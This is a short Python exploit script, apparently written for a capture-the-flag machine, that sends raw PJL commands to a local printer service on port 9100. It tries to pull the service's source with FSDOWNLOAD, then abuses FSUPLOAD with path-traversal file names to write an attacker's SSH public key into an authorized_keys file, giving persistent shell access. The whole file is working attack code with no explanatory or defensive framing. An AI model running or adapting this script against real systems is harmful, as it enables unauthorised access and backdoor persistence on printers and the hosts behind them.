#!/usr/bin/env python3
"""Paperwork Easy pivot — PJL FS* (run on target as lp)."""
import socket
import sys

HOST, PORT = "127.0.0.1", 9100
KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
UEL = b"\x1b%-12345X"


def exchange(payload: bytes, timeout: float = 8.0) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    out = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    return out


def try_download_source() -> None:
    for spec in (
        b'@PJL FSDOWNLOAD NAME="jetdirect.py"\r\n',
        b'@PJL FSDOWNLOAD NAME="jetdirect.py"\r\nOFFSET=0\r\nSIZE=5119\r\n',
        UEL + b'@PJL FSDOWNLOAD NAME="jetdirect.py"\r\n',
    ):
        r = exchange(spec, 12)
        print("DL", len(r), r[:120])
        if b"def " in r or b"import " in r:
            print("=== SOURCE ===")
            sys.stdout.buffer.write(r)
            return


def try_upload_keys() -> None:
    n = len(KEY)
    paths = (
        "../.ssh/authorized_keys",
        "0:../.ssh/authorized_keys",
        "1/../.ssh/authorized_keys",
    )
    for path in paths:
        # HP-style job wrapper
        body = (
            UEL
            + b"@PJL JOB NAME=upload\r\n"
            + f'@PJL FSUPLOAD NAME="{path}"\r\n'.encode()
            + f"SIZE={n}\r\n".encode()
            + KEY
            + b"@PJL EOJ\r\n"
            + UEL
        )
        r = exchange(body, 6)
        print("UP_JOB", path, repr(r[:100]))

        # minimal two-line (best prior signal)
        body2 = f'@PJL FSUPLOAD NAME="{path}"\r\nSIZE={n}\r\n'.encode() + KEY
        r2 = exchange(body2, 6)
        print("UP_MIN", path, repr(r2[:100]) if r2 else "EMPTY/TIMEOUT")


def main() -> None:
    try_download_source()
    try_upload_keys()


if __name__ == "__main__":
    main()